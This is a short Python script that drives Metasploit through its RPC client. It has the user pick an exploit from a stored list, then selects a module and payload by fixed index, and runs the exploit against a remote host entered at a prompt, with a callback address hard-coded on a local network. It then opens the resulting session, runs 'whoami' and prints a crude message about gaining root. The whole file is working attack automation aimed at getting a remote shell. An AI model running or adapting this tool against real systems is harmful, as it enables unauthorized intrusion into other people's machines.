#!/usr/bin/python3

import subprocess
import pprint
import json
from pymetasploit3.msfrpc import MsfRpcClient
import time


IP = "192.168.1.45"
CMD = "./explookup.sh " + IP
EXPLOIT_LIST = "./exploit_list"

# scan = subprocess.run(CMD, shell=True)

# if scan:
#     print("[i] Launching scan over @" + IP + " cmd :" + "CMD")

with open(EXPLOIT_LIST, "r+") as f:
    result = json.loads("[" + f.read() + "]")

titles=[]
for k,pwn in enumerate(result):
    titles.append([k,pwn["Title"]])

if titles:
    pprint.pprint(titles, underscore_numbers=True)

print(titles[50][1])

choice = input("[~] Please select an exploit")
attack = titles[int(choice)][1][:-12]

print("[V] Exploit selected ! :")
print(attack)

print("Starting msfrpcd...")
proc = subprocess.run("msfrpcd -P yourpassword", shell=True)
time.sleep(5)

#proc = subprocess.run("msfdb reinit", shell=True)

client = MsfRpcClient("yourpassword", ssl=True)

modules = client.modules.search(attack)
#pprint.pprint(modules)

modulus = []
for mod in modules:
    modulus.append([mod['type'],mod['fullname']])

print("[~] Available modules :")
pprint.pprint(modulus)


exploit = client.modules.use(modulus[0][0], modulus[0][1])
print("[V] Selected payloads")

print(exploit.options)


plds = exploit.targetpayloads()
print("[~] Available payloads :")
pprint.pprint(plds)

payload = client.modules.use("payload", plds[7])
print("[V] Payload selected !")

print(payload.missing_required)

exploit["RHOSTS"] = input("Remote HOST : ")
payload["LHOST"] = "192.168.1.86"

print(exploit.execute(payload=payload))

time.sleep(10)

print(client.sessions.list)

shell = client.sessions.session("1")
shell.write("whoami")
print(shell.read())

print("[V] ROOT TA GRAND ****")
